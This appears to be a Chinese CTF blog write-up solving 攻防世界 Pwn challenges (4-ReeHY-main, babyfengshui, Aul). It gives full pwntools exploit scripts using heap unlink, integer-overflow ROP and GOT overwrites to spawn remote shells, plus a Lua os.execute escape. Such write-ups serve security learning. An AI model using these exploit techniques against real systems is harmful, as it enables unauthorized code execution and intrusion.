<!DOCTYPE html>
<html lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="binLep">



<meta name="description" content="第一个 Part 2 ！！！">
<meta name="keywords" content="Pwn,Platform,攻防世界">
<meta property="og:type" content="article">
<meta property="og:title" content="【WriteUp】攻防世界--Pwn题解(Part 2)">
<meta property="og:url" content="http://binlep.github.io/2019/12/13/【WriteUp】攻防世界--Pwn题解(Part 2)/index.html">
<meta property="og:site_name" content="binLep&#39;s Blog">
<meta property="og:description" content="第一个 Part 2 ！！！">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-12-24T16:02:03.747Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="【WriteUp】攻防世界--Pwn题解(Part 2)">
<meta name="twitter:description" content="第一个 Part 2 ！！！">

<link rel="apple-touch-icon" href="/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="binLep&#39;s Blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">



    <link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
    <link href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="../../../../css/style.css">



<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>【WriteUp】攻防世界--Pwn题解(Part 2) | binLep&#39;s Blog</title>

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/jquery-ui.min.js", "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">binLep</a></h1>
        </hgroup>

        
        <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="../../../../index.html">主页</a></li>
                        
                            <li><a href="../../../../archives/">所有文章</a></li>
                        
                            <li><a href="../../../../tags/">标签云</a></li>
                        
                            <li><a href="../../../../about/">关于我</a></li>
                        
                            <li><a href="../../../../friends/">友情链接</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:1723569975@qq.com" title="Email"></a>
                            
                                <a class="fa RSS" href="../../../../atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/BugkuCTF/">BugkuCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/CryptixCTF/">CryptixCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Event/">Event</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Hackme-CTF/">Hackme CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Jarvis-OJ/">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Linux-Pwn/">Linux Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/MOCTF/">MOCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Newark-Academy-CTF/">Newark Academy CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Platfrom/">Platfrom</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/RSCTF/">RSCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/Windows-Pwn/">Windows Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/XMan/">XMan</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mipsel/">mipsel</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2libc/">ret2libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ret2shellcode/">ret2shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/xml注入/">xml注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/使用教程/">使用教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/安装教程/">安装教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/搭建Hexo/">搭建Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/模板/">模板</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/玄武杯/">玄武杯</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/问题汇总/">问题汇总</a></li></ul>
                    </div>
                </section>
                
                
                

                
                
                <section class="switch-part switch-part3">
                
                    <div id="js-aboutme">Pwn路上的小萌新~</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">binLep</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">binLep</a></h1>
            </hgroup>
            
            <p class="header-subtitle">图片托管在github，国内访问会很慢QWQ</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="../../../../index.html">主页</a></li>
                
                    <li><a href="../../../../archives/">所有文章</a></li>
                
                    <li><a href="../../../../tags/">标签云</a></li>
                
                    <li><a href="../../../../about/">关于我</a></li>
                
                    <li><a href="../../../../friends/">友情链接</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:1723569975@qq.com" title="Email"></a>
                            
                                <a class="fa RSS" target="_blank" href="../../../../atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-【WriteUp】攻防世界--Pwn题解(Part 2)" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="" class="article-date">
      <time datetime="2019-12-12T19:27:00.000Z" itemprop="datePublished">2019-12-12</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      【WriteUp】攻防世界--Pwn题解(Part 2)
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="../../../../categories/WriteUp/">WriteUp</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/Platform/">Platform</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/攻防世界/">攻防世界</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>第一个 Part 2 ！！！</p>
<a id="more"></a>

<h2 id="4-ReeHY-main-100"><a href="#4-ReeHY-main-100" class="headerlink" title="4-ReeHY-main-100"></a>4-ReeHY-main-100</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p style="font-family:Times, Georgia, serif;font-weight: bold;">方法一：</p>

<p>利用 unlink 修改存放堆地址链表上的地址为要修改的 got 表地址<br>然后修改 got 表来进行提权</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./4-ReeHY-main'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">45440</span>)</span><br><span class="line">elf = ELF(<span class="string">'./4-ReeHY-main'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">got_free = elf.got[<span class="string">'free'</span>]</span><br><span class="line">got_puts = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">plt_puts = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">addr_edit_heap = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(create_size, create_cun, create_content)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'$ '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Input size\n'</span>, str(create_size))</span><br><span class="line">    p.sendafter(<span class="string">'Input cun\n'</span>, str(create_cun))</span><br><span class="line">    p.sendafter(<span class="string">'Input content\n'</span>, create_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(delete_idx)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'$ '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Chose one to dele\n'</span>, str(delete_idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(edit_idx, edit_content)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'$ '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Chose one to edit\n'</span>, str(edit_idx))</span><br><span class="line">    p.sendafter(<span class="string">'Input the content\n'</span>, edit_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">'$ '</span>, <span class="string">'binLep'</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="number">0</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="number">1</span>, <span class="string">'a'</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="number">2</span>, <span class="string">'b'</span> * <span class="number">8</span>)</span><br><span class="line">create(<span class="number">0x100</span>, <span class="number">3</span>, <span class="string">'c'</span> * <span class="number">8</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">pd = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)  <span class="comment"># 绕过对堆空间大小的检查，同时伪造空闲堆块设置unlink</span></span><br><span class="line">pd += p64(addr_edit_heap + <span class="number">0x08</span>) + p64(addr_edit_heap + <span class="number">0x10</span>)</span><br><span class="line">pd += <span class="string">'a'</span> * <span class="number">0xe0</span></span><br><span class="line">pd += p64(<span class="number">0x100</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x200</span>, <span class="number">2</span>, pd)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">pd = p64(<span class="number">1</span>)</span><br><span class="line">pd += p64(addr_edit_heap + <span class="number">8</span>) + p64(<span class="number">1</span>)</span><br><span class="line">pd += p64(got_free) + p64(<span class="number">1</span>)</span><br><span class="line">pd += p64(got_puts) + p64(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>, pd)</span><br><span class="line">edit(<span class="number">2</span>, p64(plt_puts))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">addr_puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, addr_puts)</span><br><span class="line">libcbase = addr_puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">addr_system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(addr_system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">'addr_puts   = '</span> + hex(addr_puts))</span><br><span class="line">success(<span class="string">'addr_system = '</span> + hex(addr_system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p style="font-family:Times, Georgia, serif;font-weight: bold;">方法二：</p>

<p>创建堆块的函数中存在整数溢出，可以写入很长的字符实现栈溢出</p>
<p><code>memcpy函数</code>可以用<code>\x00</code>绕过</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./4-ReeHY-main'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">45440</span>)</span><br><span class="line">elf = ELF(<span class="string">'./4-ReeHY-main'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">got_puts = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">plt_puts = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">addr_rdi_r = <span class="number">0x400da3</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line">addr_main = <span class="number">0x400C8C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,"b *0x400A51\nb *0x400b20\nc")</span></span><br><span class="line">p.sendafter(<span class="string">'$ '</span>, <span class="string">'binLep'</span>)</span><br><span class="line">p.sendafter(<span class="string">'$ '</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendafter(<span class="string">'Input size\n'</span>, str(<span class="number">0xffffffff</span>))</span><br><span class="line">p.sendafter(<span class="string">'Input cun\n'</span>, <span class="string">'0'</span>)</span><br><span class="line">pd = <span class="string">'\x00'</span> * <span class="number">0x98</span></span><br><span class="line">pd += p64(addr_rdi_r)</span><br><span class="line">pd += p64(got_puts)</span><br><span class="line">pd += p64(plt_puts)</span><br><span class="line">pd += p64(addr_main)</span><br><span class="line">p.sendafter(<span class="string">'Input content\n'</span>, pd)</span><br><span class="line"></span><br><span class="line">addr_puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, addr_puts)</span><br><span class="line">libcbase = addr_puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">addr_system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">addr_bin_sh = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">'$ '</span>, <span class="string">'binLep'</span>)</span><br><span class="line">p.sendafter(<span class="string">'$ '</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendafter(<span class="string">'Input size\n'</span>, str(<span class="number">0xffffffff</span>))</span><br><span class="line">p.sendafter(<span class="string">'Input cun\n'</span>, <span class="string">'0'</span>)</span><br><span class="line">pd = <span class="string">'\x00'</span> * <span class="number">0x98</span></span><br><span class="line">pd += p64(addr_rdi_r)</span><br><span class="line">pd += p64(addr_bin_sh)</span><br><span class="line">pd += p64(addr_system)</span><br><span class="line">pd += p64(addr_main)</span><br><span class="line">p.sendafter(<span class="string">'Input content\n'</span>, pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="babyfengshui"><a href="#babyfengshui" class="headerlink" title="babyfengshui"></a>babyfengshui</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>这个shell超级有用！看看你能不能拿到flag！二进制可以发现在/home/ctf/上的服务器。</p>
</blockquote>
<hr>
<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h3><p>这题给的 libc 文件也是无效的</p>
<p>题目主要就是考申请堆块时，如果有比申请堆块大小大的空闲块存在，则把新堆块分配到空闲块的地址</p>
<p>之后就可以绕过 s 的地址加上写入字符串的长度是否会超过自己的 v2 的地址</p>
<p>把中间另一个堆中的 v2 块的 fd 改写，就可以实现在改写的地址内写入的操作从而提权了</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"i386"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./babyfengshui'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">35161</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyfengshui'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">got_free = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(add_size, add_text)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Action: '</span>, <span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size of description: '</span>, str(add_size))</span><br><span class="line">    p.sendlineafter(<span class="string">'name: '</span>, <span class="string">'binLep'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'text length: '</span>, str(len(add_text)))</span><br><span class="line">    p.sendlineafter(<span class="string">'text: '</span>, add_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(delete_idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Action: '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index: '</span>, str(delete_idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">(display_idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Action: '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index: '</span>, str(display_idx))</span><br><span class="line">    p.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(update_idx, update_text)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Action: '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index: '</span>, str(update_idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'text length: '</span>, str(len(update_text)))</span><br><span class="line">    p.sendlineafter(<span class="string">'text: '</span>, update_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'/bin/sh'</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">''</span>)           <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">''</span>)           <span class="comment"># 2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x108</span></span><br><span class="line">pd += p32(<span class="number">0</span>) + p32(<span class="number">0x89</span>)</span><br><span class="line">pd += <span class="string">'b'</span> * <span class="number">0x80</span></span><br><span class="line">pd += p32(<span class="number">0</span>) + p32(<span class="number">0x89</span>)</span><br><span class="line">pd += p32(got_free)</span><br><span class="line">add(<span class="number">0x100</span>, pd)          <span class="comment"># 3</span></span><br><span class="line">display(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">addr_free = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'free'</span>, addr_free)</span><br><span class="line">libcbase = addr_free - libc.dump(<span class="string">'free'</span>)</span><br><span class="line">addr_system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">2</span>, p32(addr_system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">'got_free    = '</span> + hex(got_free))</span><br><span class="line">success(<span class="string">'addr_system = '</span> + hex(addr_system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="Aul"><a href="#Aul" class="headerlink" title="Aul"></a>Aul</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h3><p>一个 lua 逃逸，挺直白的，直接输入<code>os.execute(&quot;/bin/sh&quot;)</code>提权</p>
<p>源码如下：</p>
